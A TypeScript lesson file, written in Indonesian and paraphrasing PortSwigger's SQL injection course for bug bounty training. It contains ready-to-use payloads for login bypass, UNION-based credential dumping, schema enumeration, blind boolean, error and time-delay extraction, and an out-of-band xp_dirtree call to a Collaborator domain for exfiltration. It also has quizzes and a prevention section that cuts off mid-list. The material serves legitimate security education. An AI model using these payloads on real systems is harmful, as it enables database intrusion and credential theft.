import type { Lesson } from "./lesson-types";

// ============================================================
// PortSwigger — SQL Injection (track /sqli)
// Ditulis ulang gaya Alif: problem-first, padat, hands-on.
// Sumber di-link di tiap lesson; konten tetap parafrase, bukan salinan.
// ============================================================

export const SQLI_LESSONS: Lesson[] = [
  // ---------------------------------------------------------- 01
  {
    slug: "sqli-01",
    tid: "ps-sqli-main",
    title: "Apa Itu SQL Injection & Kenapa Tetap Raja Bug",
    minutes: 10,
    source: {
      label: "PortSwigger — What is SQL injection?",
      url: "https://portswigger.net/web-security/sql-injection",
    },
    untukApa: [
      "SQLi masih termasuk bug paling berdampak di bug bounty: satu titik injeksi bisa buka seluruh database.",
      "Kamu perlu paham MEKANISMEnya — bukan hafal payload — supaya bisa menemukannya di aplikasi nyata (skill inti untuk program bug bounty-mu).",
    ],
    sections: [
      {
        h: "Masalah yang diselesaikan attacker",
        p: [
          "Web app nyaris selalu punya database. Setiap kali kamu search produk, login, atau filter kategori, app menyusun query SQL dan MENGIRIMNYA ke database. Masalahnya: kalau input kamu digabung langsung ke teks query (string concatenation), input kamu tidak lagi 'data' — ia jadi bagian dari PERINTAH.",
          "SQL injection = kerentanan yang memungkinkan attacker mencampuri (interfere) query yang dikirim app ke database. Akibatnya attacker bisa membaca data yang seharusnya tidak bisa diakses (data user lain, password hash, data pribadi), bahkan mengubah/menghapusnya.",
        ],
        callout:
          "Istilah kunci: 'interfere with the queries' — SQLi bukan cuma 'nambahin OR 1=1'. Siapa pun yang bisa mengubah STRUKTUR query (menambah kondisi, membatalkan sisa query, menggabungkan query lain) sedang melakukan SQLi.",
      },
      {
        h: "Seberapa parah dampaknya?",
        table: {
          head: ["Level", "Yang bisa terjadi"],
          rows: [
            ["Data exposure", "Baca password, kartu kredit, data pribadi — sumber data breach besar & denda regulasi"],
            ["Data tampering", "Ubah/isu ulang konten app, modifikasi data user lain"],
            ["Persistence", "Backdoor yang bertahan lama di sistem organisasi tanpa ketahuan"],
            ["Server compromise", "Eskalasi ke server database / backend infrastruktur (RCE via DB feature)"],
            ["DoS", "Query berat atau drop tabel — layanan tumbang"],
          ],
        },
      },
      {
        h: "Di mana titik injeksi bisa muncul?"
      },
      {
        p: [
          "Mayoritas kasus ada di WHERE clause query SELECT (contoh: filter kategori, pencarian). TAPI itu bukan satu-satunya lokasi — dan tester berpengalaman selalu cek lokasi lain:",
        ],
        list: [
          "UPDATE — pada nilai yang di-update atau WHERE clause-nya",
          "INSERT — pada nilai yang disisipkan (registrasi, komentar)",
          "SELECT — pada nama tabel/kolom (jarang, tapi ada)",
          "ORDER BY — pada parameter sorting (asc/desc, sort=price)",
        ],
        callout:
          "Mindset bug bounty: 'parameter' itu bukan cuma yang di URL. Cookie, header (X-Forwarded-For, Referer), dan body JSON semuanya bisa jadi titik injeksi.",
      },
      {
        h: "Cara mendeteksi SQLi (yang akan kamu pakai terus)",
        list: [
          "Kirim karakter kutip satu (') → lihat apakah muncul error atau anomali respons",
          "Kirim syntax yang hasilnya sama dengan nilai asli vs nilai berbeda → bandingkan respons secara sistematis",
          "Kondisi boolean OR 1=1 vs OR 1=2 → respons beda = sinyal kuat",
          "Payload time delay (query disengaja lambat) → jika respons melambat, injeksi terkonfirmasi",
          "Payload OAST (out-of-band) → query memicu koneksi DNS/HTTP keluar ke server yang kamu kontrol",
        ],
      },
    ],
    lab: {
      title: "Lab 0 — Kenal query sebelum menyuntiknya",
      intro:
        "Sebelum menyentuh lab PortSwigger, pastikan kamu bisa MEMBACA query. Ini fondasi semua lesson berikutnya.",
      steps: [
        "Buka SQLBolt (link di bawah) dan kerjakan lesson 1–2 sampai lancar membaca SELECT ... WHERE.",
        "Tulis dengan tanganmu: query untuk 'ambil semua produk kategori Gifts yang sudah dirilis'.",
        "Sekarang tambahkan karakter ' setelah 'Gifts' secara mental — pertanyaannya: kalau app menggabungkan input langsung, apa yang terjadi dengan sisa query?",
      ],
      hint: "Kutip satu yang tidak ditutup membuat string 'nyangkut' — sisa query jadi error. Itulah sinyal error yang dicari attacker.",
    },
    quiz: [
      {
        q: "Inti dari kerentanan SQL injection adalah…",
        options: [
          "Attacker bisa mengubah struktur query SQL yang dikirim aplikasi ke database",
          "Attacker bisa membaca file di server lewat URL",
          "Database tidak dienkripsi saat istirahat",
          "Attacker bisa menebak password admin",
        ],
        answer: 0,
        why: "SQLi terjadi karena input user masuk ke query sebagai KODE, bukan data — sehingga struktur query bisa dicampuri. Dampak (baca/ubah data) adalah konsekuensinya.",
      },
      {
        q: "Lokasi injeksi yang PALING sering ditemukan adalah…",
        options: [
          "Nama host di URL",
          "WHERE clause pada query SELECT",
          "Header User-Agent di log server",
          "Nama file di server",
        ],
        answer: 1,
        why: "Mayoritas SQLi ada di WHERE clause SELECT (filter, search). Tapi tetap wajib cek UPDATE, INSERT, ORDER BY, dan nama tabel/kolom.",
      },
      {
        q: "Kamu menguji parameter kategori dengan OR 1=1 dan OR 1=2. Respons keduanya BERBEDA. Artinya…",
        options: [
          "Parameter aman karena respons berbeda",
          "Ada indikasi kuat input masuk ke query SQL — layak digali lebih dalam",
          "Pasti sudah ada WAF",
          "Aplikasi menggunakan ORM",
        ],
        answer: 1,
        why: "Perbedaan respons yang sistematis mengikuti kondisi boolean = sinyal klasik input dieksekusi sebagai bagian query. Bukan bukti final, tapi petunjuk terkuat untuk digali.",
      },
      {
        q: "Payload time delay bekerja mendeteksi SQLi karena…",
        options: [
          "Database mengirim email ke attacker",
          "Query yang lambat membuat respons HTTP ikut terlambat — perbedaan waktu = jawaban kondisi",
          "Delay membuat error muncul di log",
          "Server restart setiap kali delay dikirim",
        ],
        answer: 1,
        why: "Query SQL diproses sinkron: kalau querynya disengaja nunggu 10 detik, respons HTTP juga nunggu 10 detik. Waktu jadi kanal info saat error tidak tampak.",
      },
    ],
  },

  // ---------------------------------------------------------- 02
  {
    slug: "sqli-02",
    tid: "ps-sqli-hidden-data",
    title: "Mengambil Data Tersembunyi (Hidden Data)",
    minutes: 12,
    source: {
      label: "PortSwigger — SQLi (bagian Retrieving hidden data)",
      url: "https://portswigger.net/web-security/sql-injection#retrieving-hidden-data",
    },
    untukApa: [
      "Ini tipe SQLi pertama yang harus kamu kuasai: membuka data yang disembunyikan lewat kondisi query.",
      "Langsung dipakai di lab pertama PortSwigger (retrieval of hidden data).",
    ],
    sections: [
      {
        h: "Anatomi query yang rentan"
      },
      {
        p: [
          "App toko menampilkan produk per kategori. Kamu klik kategori Gifts → browser request /products?category=Gifts → app menyusun query:",
        ],
        code: "SELECT * FROM products WHERE category = 'Gifts' AND released = 1",
      },
      {
      },
      {
        p: [
          "Kondisi released = 1 adalah SENSOR: produk yang belum dirilis (released = 0) disembunyikan. Attacker tidak perlu 'bocor' — cukup memanipulasi kondisinya.",
        ],
      },
      {
        h: "Teknik 1: komentari sensor dengan --",
        code: "/products?category=Gifts'--\n\n-- Query yang terbentuk:\nSELECT * FROM products WHERE category = 'Gifts'--' AND released = 1"
      },
      {
        p: [
          "Kutip satu menutup string 'Gifts'. Lalu -- adalah komentar SQL: SISA QUERY DIABAIKAN. Kondisi released = 1 hilang → semua produk tampil, termasuk yang belum dirilis.",
        ],
      },
      {
        h: "Teknik 2: OR 1=1 (selalu benar)",
        code: "/products?category=Gifts'+OR+1=1--\n\n-- Query yang terbentuk:\nSELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1"
      },
      {
        p: [
          "Kondisi category = 'Gifts' OR 1=1 bernilai benar untuk SEMUA baris (karena 1=1 selalu benar) → seluruh isi tabel tampil, termasuk kategori lain.",
        ],
        callout:
          "PERINGATAN dari PortSwigger: OR 1=1 terlihat jinak di SELECT, tapi data dari satu request bisa dipakai ulang app di query lain. Kalau kondisimu nyangkut di UPDATE atau DELETE, kamu bisa menghapus data secara tidak sengaja. Di lab aman; di dunia nyata, pikirkan dulu sebelum OR 1=1.",
      },
      {
        h: "Teknik 3: subverting logic (login bypass)"
      },
      {
        p: [
          "Varian yang sama, targetnya logika app. Saat login, app cek kredensial:",
        ],
        code: "SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'"
      },
      {
        p: [
          "Kalau query mengembalikan 1 baris user, login sukses. Attacker isi username administrator'-- dan password kosong:",
        ],
        code: "SELECT * FROM users WHERE username = 'administrator'--' AND password = ''"
      },
      {
        p: [
          "Cek password terkomentar total → login sebagai administrator TANPA password. Ini lab kedua yang akan kamu kerjakan.",
        ],
      },
    ],
    lab: {
      title: "Lab 1 — SQLi in WHERE clause allowing retrieval of hidden data",
      steps: [
        "Buka lab (link sumber → View all labs → 'SQL injection vulnerability in WHERE clause allowing the retrieval of hidden data').",
        "Di browser lab, ke kategori apa pun, perhatikan parameter ?category=... di URL.",
        "Tambahkan ' di akhir nilai kategori — amati error atau perubahan respons (ini konfirmasi injeksi).",
        "Solve dengan: ' OR 1=1-- (atau '-- saja). Target lab: tampilkan semua produk termasuk yang disembunyikan.",
        "CATAT di learning-journey-mu: payload apa, kenapa bekerja (kondisi mana yang dimatikan).",
      ],
      hint: "Kalau ' OR 1=1-- gagal, coba tanda + sebagai pengganti spasi di URL: Gifts'+OR+1=1--",
    },
    quiz: [
      {
        q: "Payload Gifts'-- bekerja menghilangkan sensor released=1 karena…",
        options: [
          "-- menghapus tabel released",
          "-- adalah komentar SQL — sisa query setelahnya diabaikan",
          "Database menolak kondisi released",
          "Kutip satu mengenkripsi query",
        ],
        answer: 1,
        why: "-- mengomentari sisa baris query. Kondisi AND released = 1 tidak pernah dieksekusi, jadi semua baris lolos.",
      },
      {
        q: "Kenapa OR 1=1 berbahaya jika dikirim buta ke aplikasi nyata?",
        options: [
          "Karena 1=1 selalu error di database",
          "Data request yang sama bisa dipakai di query UPDATE/DELETE → risiko hapus data",
          "Karena WAF pasti memblokirnya dan memicu alarm",
          "Karena membuat query lebih lambat",
        ],
        answer: 1,
        why: "Input satu request sering dipakai ulang di beberapa query. Kondisi 'selalu benar' yang nyangkut di DELETE = semua baris terhapus. PortSwigger menandai ini sebagai warning eksplisit.",
      },
      {
        q: "Login bypass administrator'-- bekerja karena…",
        options: [
          "Password administrator memang kosong",
          "Cek password dikomentari — query cukup cocokkan username saja",
          "SQL mereset password jadi NULL",
          "App fallback ke akun guest",
        ],
        answer: 1,
        why: "Query hanya mencocokkan username; kondisi AND password = '' ikut terkomentar. Baris administrator terkembalikan → login sukses.",
      },
      {
        q: "Di URL, spasi di payload sering diganti karakter…",
        options: ["%", "+", "&", "@"],
        answer: 1,
        why: "Di query string URL, + mewakili spasi (dan %20 juga valid). Tanpa itu, payload terpotong dan query rusak.",
      },
    ],
  },

  // ---------------------------------------------------------- 03
  {
    slug: "sqli-03",
    tid: "ps-sqli-union",
    title: "UNION Attack: Mencuri Data dari Tabel Lain",
    minutes: 15,
    source: {
      label: "PortSwigger — SQL injection UNION attacks",
      url: "https://portswigger.net/web-security/sql-injection/union-attacks",
    },
    untukApa: [
      "Hidden data cuma membuka data yang query asli ambil. UNION menambah query BARU — dari tabel mana pun. Ini lompatan level: dari 'buka pintu' ke 'bawa kabur seluruh lemari arsip'.",
      "Mekanisme hitung kolom + cek tipe data ini dipakai di banyak lab dan sering muncul di program bounty nyata.",
    ],
    sections: [
      {
        h: "Konsep UNION",
        code: "SELECT a, b FROM table1\nUNION\nSELECT c, d FROM table2"
      },
      {
        p: [
          "UNION menjalankan query tambahan dan MENEMPELKAN hasilnya ke hasil query asli — satu result set gabungan. Syarat mutlak:",
        ],
        list: [
          "Jumlah kolom query asli dan query injeksi HARUS SAMA",
          "Tipe data tiap kolom harus kompatibel",
        ],
        callout:
          "Karena itu langkah pertama UNION attack selalu: (1) cari jumlah kolom, (2) cari kolom yang bisa menampung string. Dua langkah inilah yang dilatih lab.",
      },
      {
        h: "Cara 1 menghitung kolom: ORDER BY bertingkat",
        code: "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--"
      },
      {
        p: [
          "ORDER BY bisa pakai index kolom (tidak perlu tahu nama kolom). Naikkan angkanya satu-satu: begitu index melebihi jumlah kolom asli, database error (mis. 'ORDER BY position number 3 is out of range'). Error terakhir yang masih sukses = jumlah kolom.",
        ],
      },
      {
        h: "Cara 2: UNION SELECT NULL bertingkat",
        code: "' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--"
      },
      {
        p: [
          "Kalau jumlah NULL tidak sama dengan jumlah kolom → error. Kenapa NULL? Karena NULL konvertibel ke SEMUA tipe data umum, jadi payload ini gagal HANYA karena salah hitung kolom — bukan karena tipe. Begitu jumlah pas, respons berubah (baris tambahan berisi NULL, atau efek lain yang terdeteksi).",
        ],
        callout:
          "Catatan sintaks: Oracle wajib FROM DUAL (' UNION SELECT NULL FROM DUAL--). Di MySQL, -- harus diikuti spasi (atau pakai #). Sintaks per-database ada di cheat sheet — bookmark!",
      },
      {
        h: "Cari kolom yang bisa menampung string",
        code: "' UNION SELECT 'a',NULL,NULL,NULL--\n' UNION SELECT NULL,'a',NULL,NULL--\n' UNION SELECT NULL,NULL,'a',NULL--\n' UNION SELECT NULL,NULL,NULL,'a'--"
      },
      {
        p: [
          "Geser string 'a' ke tiap kolom bergantian. Kolom yang menerima 'a' TANPA error = kolom bertipe string → di situlah data curianmu akan muncul di halaman. Kolom angka akan error: 'Conversion failed when converting the varchar value 'a' to data type int'.",
        ],
      },
      {
        h: "Eksekusi: ambil data menarik",
        code: "' UNION SELECT username, password FROM users--"
      },
      {
        p: [
          "Contoh: query asli mengembalikan 2 kolom string. Kalau database punya tabel users dengan kolom username & password, kredensial seluruh user muncul langsung di halaman produk.",
          "Kalau query asli hanya punya SATU kolom string, gabungkan dua nilai sekaligus dengan concatenation (Oracle: ||, MySQL: CONCAT):",
        ],
        code: "' UNION SELECT username || '~' || password FROM users--\n-- Output: administrator~s3cure / wiener~peter / carlos~montoya",
      },
    ],
    lab: {
      title: "Lab 2 — UNION attack, determining the number of columns",
      steps: [
        "Buka lab 'UNION attack, determining the number of columns returned' dari link sumber.",
        "Tentukan titik injeksi (parameter kategori), lalu jalankan serangkaian ' ORDER BY N-- sampai error.",
        "Konfirmasi dengan ' UNION SELECT NULL,...-- sesuai jumlah kolom yang ditemukan.",
        "Bonus pemahaman: coba juga NULL bertingkat dulu tanpa ORDER BY — bandingkan mana yang lebih cepat kamu andalkan.",
      ],
      hint: "Error yang muncul mungkin bukan teks database — bisa berupa halaman error generik atau response kosong. Yang kamu deteksi adalah PERUBAHAN respons, bukan teks errornya.",
    },
    quiz: [
      {
        q: "Dua syarat mutlak UNION attack adalah…",
        options: [
          "Jumlah kolom sama dan tipe data kompatibel",
          "Password admin lemah dan WAF off",
          "Query asli harus SELECT * dan database online",
          "Kolom pertama harus bernama id",
        ],
        answer: 0,
        why: "UNION menggabungkan dua result set — database menuntut jumlah kolom identik dan tipe yang kompatibel per kolom. Dua ' Enumeration' step (hitung kolom, cari kolom string) ada untuk memenuhi syarat ini.",
      },
      {
        q: "Kenapa payload hitung kolom memakai NULL, bukan angka seperti 1?",
        options: [
          "NULL lebih cepat diproses",
          "NULL konvertibel ke semua tipe — kegagalan hanya karena salah jumlah kolom",
          "Angka dilarang di UNION",
          "NULL membuat error terlihat di log",
        ],
        answer: 1,
        why: "Kalau kamu isi angka/teks dan tipe kolom tidak cocok, error bisa berarti 'tipe salah' ATAU 'jumlah salah' — kamu tidak bisa membedakan. NULL menghilangkan variabel tipe.",
      },
      {
        q: "Query asli mengembalikan 3 kolom; hanya kolom ke-2 bertipe string. Payload untuk mencuri username dari tabel users adalah…",
        options: [
          "' UNION SELECT username, NULL, NULL FROM users--",
          "' UNION SELECT NULL, username, NULL FROM users--",
          "' UNION SELECT NULL, NULL, username FROM users--",
          "' UNION SELECT username FROM users--",
        ],
        answer: 1,
        why: "Username harus ditaruh di kolom yang bisa menampung string (kolom ke-2). Kolom lain diisi NULL agar jumlah kolom tetap 3.",
      },
      {
        q: "Di Oracle, payload UNION harus menambahkan…",
        options: [
          "FROM DUAL",
          "USE master",
          "LIMIT 1",
          "TOP 1",
        ],
        answer: 0,
        why: "Setiap SELECT di Oracle wajib punya FROM dan tabel valid. Tabel dummy bawaan DUAL memenuhi itu: ' UNION SELECT NULL FROM DUAL--.",
      },
    ],
  },

  // ---------------------------------------------------------- 04
  {
    slug: "sqli-04",
    tid: "ps-sqli-examining-db",
    title: "Enumerasi Database: Tahu Isi Lemari Sebelum Dibuka",
    minutes: 12,
    source: {
      label: "PortSwigger — Examining the database in SQL injection attacks",
      url: "https://portswigger.net/web-security/sql-injection/examining-the-database",
    },
    untukApa: [
      "UNION butuh nama tabel & kolom yang benar. Menebak buta = gagal. Enumerasi memberimu PETA database: tipe DB, versi, tabel, kolom.",
      "Skill ini yang membedakan attacker yang berhenti di error vs yang mengekstrak data.",
    ],
    sections: [
      {
        h: "Langkah 1 —Identifikasi tipe & versi database"
      },
      {
        p: [
          "Setiap DB punya query versi yang berbeda. Coba satu per satu sampai satu yang merespons:",
        ],
        table: {
          head: ["Database", "Query versi"],
          rows: [
            ["Microsoft / MySQL", "SELECT @@version"],
            ["Oracle", "SELECT * FROM v$version"],
            ["PostgreSQL", "SELECT version()"],
          ],
        }
      },
      {
        p: [
          "Contoh eksekusi via UNION: ' UNION SELECT @@version-- → respons bisa memuat string seperti 'Microsoft SQL Server 2016 (SP2)...' → tipe dan versi terkonfirmasi sekaligus. Versi penting: versi lama = kerentanan publik yang bisa dipakai.",
        ],
      },
      {
        h: "Langkah 2 — Daftar tabel via information_schema"
      },
      {
        p: [
          "Hampir semua DB modern (kecuali Oracle) punya information_schema — katalog yang mendeskripsikan database itu sendiri.",
        ],
        code: "SELECT * FROM information_schema.tables\n\n-- Output:\n-- TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE\n-- MyDatabase    | dbo          | Products   | BASE TABLE\n-- MyDatabase    | dbo          | Users      | BASE TABLE\n-- MyDatabase    | dbo          | Feedback   | BASE TABLE"
      },
      {
        p: ["Lalu bedah kolom dari tabel yang menarik:"],
        code: "SELECT * FROM information_schema.columns WHERE table_name = 'Users'\n\n-- Output:\n-- UserId int | Username varchar | Password varchar",
        callout:
          "Dipadukan dengan UNION: ' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables-- → daftar seluruh tabel tampil di halaman. Ini workflow standar lab 'UNION attack to retrieve interesting data'.",
      },
      {
        h: "Versi Oracle",
        code: "SELECT * FROM all_tables\nSELECT * FROM all_tab_columns WHERE table_name = 'USERS'",
      },
    ],
    lab: {
      title: "Lab 3 — Peta database dengan UNION + information_schema",
      steps: [
        "Di lab UNION 'retrieve interesting data' (link di track /sqli), gunakan payload UNION untuk mencantumkan semua tabel via information_schema.tables.",
        "Pilih tabel yang berisi kredensial, lalu enumerasi kolomnya via information_schema.columns.",
        "Eksekusi UNION final untuk menampilkan isi kolom kredensial — lab solved.",
        "Simpan payload chain-mu (version → tables → columns → dump) sebagai template di learning-journey. Pola ini dipakai ulang terus.",
      ],
      hint: "Chain lengkapnya: ' UNION SELECT @@version-- → ' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables-- → ' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name='users...' → dump kolom.",
    },
    quiz: [
      {
        q: "Untuk mengidentifikasi tipe database via SQLi, langkah standarnya adalah…",
        options: [
          "Membaca header Server di respons HTTP",
          "Menyuntikkan query versi khas tiap provider dan melihat mana yang merespons",
          "Menanyakan ke admin aplikasi",
          "Melihat ekstensi file di URL",
        ],
        answer: 1,
        why: "SELECT @@version (MySQL/MSSQL), v$version (Oracle), version() (PostgreSQL) — hanya DB yang cocok yang akan mengembalikan hasil, jadi respons yang sukses = identitas DB.",
      },
      {
        q: "information_schema adalah…",
        options: [
          "Tabel data user yang sering berisi password",
          "Katalog bawaan DB yang memuat metadata: daftar tabel, kolom, tipe data",
          "Fitur backup otomatis",
          "Nama database default di MySQL",
        ],
        answer: 1,
        why: "information_schema.tables dan .columns memberi peta struktur database — kombinasi dengan UNION membuat enumerasi terlihat langsung di halaman.",
      },
      {
        q: "Untuk menampilkan daftar semua nama tabel via UNION pada 2 kolom string, payload-nya…",
        options: [
          "' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables--",
          "' UNION SELECT * FROM tables--",
          "' UNION SELECT tables, columns FROM schema--",
          "SELECT TABLE_NAME FROM information_schema.tables--",
        ],
        answer: 0,
        why: "Kolom TABLE_NAME diambil dari information_schema.tables, ditampung di kolom string pertama, kolom kedua diisi NULL. Sisa query asli dikomentari.",
      },
      {
        q: "Di Oracle, padanan enumerasi tabel adalah query ke…",
        options: ["all_tables", "information_schema.tables", "sys.tables", "sqlite_master"],
        answer: 0,
        why: "Oracle tidak punya information_schema standar — pakai all_tables (daftar tabel) dan all_tab_columns (daftar kolom).",
      },
    ],
  },

  // ---------------------------------------------------------- 05
  {
    slug: "sqli-05",
    tid: "ps-sqli-blind",
    title: "Blind SQLi: Ketika Database Diam Tapi Bocor",
    minutes: 15,
    source: {
      label: "PortSwigger — Blind SQL injection",
      url: "https://portswigger.net/web-security/sql-injection/blind",
    },
    untukApa: [
      "Sebagian besar SQLi nyata adalah BLIND: hasil query dan error TIDAK pernah muncul di respons. Teknik UNION tidak bekerja di sini.",
      "Blind SQLi melatih pola pikir yang dipakai di bug bounty: ekstrak data lewat sinyal tidak langsung (perilaku, waktu, error, DNS).",
    ],
    sections: [
      {
        h: "Kenapa 'blind' itu masalah"
      },
      {
        p: [
          "App rentan tetap mengeksekusi query injeksi-mu, TAPI respons tidak memuat hasil query maupun error database. UNION gagal karena tidak ada yang bisa dilihat. Solusinya: ubah pertanyaan dari 'tampilkan datanya' menjadi 'kabari saya kondisinya benar atau salah'.",
        ],
      },
      {
        h: "Teknik 1 — Conditional responses (boolean-based)"
      },
      {
        p: [
          "Contoh klasik: app punya cookie TrackingId dan menampilkan 'Welcome back' HANYA jika cookie dikenal. Query backend: SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '...' — rentan, tapi hasilnya tidak tampil.",
          "Kamu tetap bisa bertanya satu kondisi per request:",
        ],
        code: "Cookie: TrackingId=xyz' AND '1'='1   → 'Welcome back' MUNCUL\nCookie: TrackingId=xyz' AND '1'='2   → 'Welcome back' HILANG"
      },
      {
        p: [
          "Perbedaan perilaku app = kanal 1 bit per request. Sekarang ekstrak data karakter demi karakter:",
        ],
        code: "xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 'm\n-- muncul  → karakter pertama > 'm'\nxyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 't\n-- hilang → tidak lebih dari 't'\nxyz' AND SUBSTRING((SELECT Password ...), 1, 1) = 's\n-- muncul → karakter pertama = 's'",
        callout:
          "Ini binary search manual. Di lab nyata, intruder/ffuf/turbo intruder yang mengotomatiskan a→z 0→9 per posisi. Pahami MEKANISMENYA dulu, baru otomasi.",
      },
      {
        h: "Teknik 2 — Conditional errors"
      },
      {
        p: [
          "Kalau perilaku app TIDAK berubah apa pun hasil query, coba picu ERROR secara kondisional. Pola umum: CASE WHEN <kondisi> THEN 1/0 ELSE 'a' END — pembagian nol terjadi HANYA jika kondisi benar:",
        ],
        code: "xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a   → tanpa error\nxyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   → error!"
      },
      {
        p: [
          "Kalau error membuat respons berbeda, kamu punya kanal boolean lagi — sama seperti teknik 1, tapi sinyalnya 'error vs tidak'.",
        ],
      },
      {
        h: "Teknik 3 — Verbose error messages"
      },
      {
        p: [
          "Misconfigurasi kadang membuat error membocorkan data. Klasik: paksa CAST string ke int — errornya MENAMPILKAN string itu:",
        ],
        code: "CAST((SELECT example_column FROM example_table) AS int)\n-- Error: invalid input syntax for type integer: \"Example data\""
      },
      {
        p: [
          "Data yang seharusnya tersembunyi jadi tampil di pesan error. Blind berubah jadi visible satu langkah.",
        ],
      },
      {
        h: "Teknik 4 — Time delays"
      },
      {
        p: [
          "Kalau error pun di-tangkap app (respons selalu sama), pakai WAKTU sebagai kanal. Query diproses sinkron — delay di query = delay di respons:",
        ],
        code: "'; IF (1=2) WAITFOR DELAY '0:0:10'--   → respons cepat\n'; IF (1=1) WAITFOR DELAY '0:0:10'--   → respons 10 detik"
      },
      {
        p: [
          "Sama seperti sebelumnya, kondisinya bisa SUBSTRING password → ekstraksi satu karakter per 10 detik. Lambat, tapi bekerja tanpa satu pun perubahan tampilan.",
        ],
      },
      {
        h: "Teknik 5 — Out-of-band (OAST)"
      },
      {
        p: [
          "Kasus terpencil: query dijalankan ASINKRON di thread lain — respons, error, dan waktu semuanya tidak berubah. Sisa satu kanal: koneksi KELUAR dari server ke sistemmu.",
          "Contoh MSSQL yang memicu DNS lookup ke domain Burp Collaborator:",
        ],
        code: "'; exec master..xp_dirtree '//subdomainmu.burpcollaborator.net/a'--"
      },
      {
        p: [
          "Bahkan data bisa DIBEKALI langsung ke domain: password di-append ke subdomain → password terbaca dari log Collaborator. DNS sering paling efektif karena hampir semua firewall mengizinkan egress DNS.",
        ],
        callout:
          "Pencegahannya tetap SAMA seperti SQLi biasa: parameterized queries. Mekanisme eksploit beda-beda, akar masalahnya satu: input digabung ke struktur query.",
      },
    ],
    lab: {
      title: "Lab 4 — Blind boolean-based (conditional responses)",
      steps: [
        "Dari halaman Blind SQLi (link sumber), buka lab 'Blind SQL injection with conditional responses'.",
        "Identifikasi cookie TrackingId dan sinyal 'Welcome back'.",
        "Verifikasi kanal boolean: AND '1'='1 vs AND '1'='2.",
        "Ekstrak: panjang password (LENGTH), lalu karakter per posisi (SUBSTRING). Manual dulu 2–3 karakter, lalu otomasi dengan Intruder (cluster bomb: posisi × charset).",
        "Login sebagai administrator dengan password hasil ekstraksi.",
      ],
      hint: "Ekspresi util: LENGTH((SELECT password FROM users WHERE username='administrator'))>N untuk panjang; SUBSTRING(...,P,1)='c' per posisi P. Charset a-z0-9 cukup untuk lab.",
    },
    quiz: [
      {
        q: "Yang membuat SQLi disebut 'blind' adalah…",
        options: [
          "Database dienkripsi penuh",
          "Respons app tidak memuat hasil query maupun error database",
          "Attacker tidak punya akses internet",
          "Query selalu gagal dieksekusi",
        ],
        answer: 1,
        why: "Query tetap dieksekusi — tapi kanal 'lihat hasil' tertutup. Eksploitasi bergantung pada sinyal tidak langsung: perilaku, error, waktu, atau koneksi keluar.",
      },
      {
        q: "Teknik conditional responses mengekstrak data lewat…",
        options: [
          "Menampilkan isi tabel di halaman",
          "Perbedaan respons app terhadap kondisi yang disuntikkan (1 bit per request)",
          "Mengirim email ke attacker",
          "Mengganti password user",
        ],
        answer: 1,
        why: "Kondisi AND/SUBSTRING membuat respons berbeda (mis. 'Welcome back' muncul/hilang) → data digali karakter per karakter.",
      },
      {
        q: "Pola CASE WHEN (kondisi) THEN 1/0 ELSE 'a' END dipakai untuk…",
        options: [
          "Mempercepat query",
          "Memicu error database HANYA saat kondisi benar — kanal boolean lewat error",
          "Mengenkripsi hasil query",
          "Menggabungkan dua query",
        ],
        answer: 1,
        why: "1/0 = divide-by-zero error kondisional. Kalau respons error berbeda dari respons normal, kondisi bisa diuji satu per satu.",
      },
      {
        q: "Kapan OAST (out-of-band) jadi pilihan yang paling mungkin?",
        options: [
          "Saat database offline",
          "Saat query dijalankan asinkron — respons, error, dan waktu tidak berubah; sisa kanal adalah koneksi keluar (mis. DNS)",
          "Saat payload harus pendek",
          "Saat app pakai ORM",
        ],
        answer: 1,
        why: "OAST bekerja persis di kasus di mana semua teknik berbasis respons gagal: thread terpisah, tanpa perbedaan konten/waktu. Data bahkan bisa dieksfiltrasi langsung ke subdomain yang kamu kontrol.",
      },
    ],
  },

  // ---------------------------------------------------------- 06
  {
    slug: "sqli-06",
    tid: "ps-sqli-prevent",
    title: "Prevention: Parameterized Queries & Batasnya",
    minutes: 10,
    source: {
      label: "PortSwigger — How to prevent SQL injection",
      url: "https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection",
    },
    untukApa: [
      "Report bug bounty yang bagus menunjukkan DAMPAK + REKOMENDASI. Pahami cara pencegahan yang benar = laporanmu lebih kredibel.",
      "Sebagai developer (thesis & proyekmu), ini yang menyelamatkan aplikasimu sendiri.",
    ],
    sections: [
      {
        h: "Akar masalah: string concatenation",
        code: "// RENTAN — input digabung ke teks query\nString query = \"SELECT * FROM products WHERE category = '\" + input + \"'\";\nStatement statement = connection.createStatement();\nResultSet rs = statement.executeQuery(query);"
      },
      {
        p: [
          "Input masuk sebagai BAGIAN DARI KODE. Itulah satu-satunya akar SQLi — semua teknik eksploitasi menunggangi ini.",
        ],
      },
      {
        h: "Solusi utama: parameterized queries (prepared statements)",
        code: "// AMAN — struktur query fix, input hanya data\nPreparedStatement st = connection.prepareStatement(\n    \"SELECT * FROM products WHERE category = ?\");\nst.setString(1, input);\nResultSet rs = st.executeQuery();"
      },
      {
        p: [
          "Query dikirim dengan STRUKTUR yang sudah fix (placeholder ?), lalu input dikirim terpisah sebagai parameter. Database tidak pernah mencampur keduanya — input tidak mungkin mengubah struktur. Berlaku untuk input di WHERE, INSERT, UPDATE values.",
        ],
        callout:
          "Aturan emas dari PortSwigger: string query harus KONSTANTA hardcoded — jangan pernah mengandung data variabel dari asal mana pun. Jangan 'sana aman concatenate, sini parameterize' — perbedaan keputusan per-kasus adalah sumber kesalahan klasik.",
      },
      {
        h: "Batas parameterized queries"
      },
      {
        p: [
          "Parameter hanya bisa menggantikan DATA — bukan struktur query. Untuk input di nama tabel, nama kolom, atau ORDER BY, parameterized tidak bisa dipakai. Alternatifnya:",
        ],
        list: [
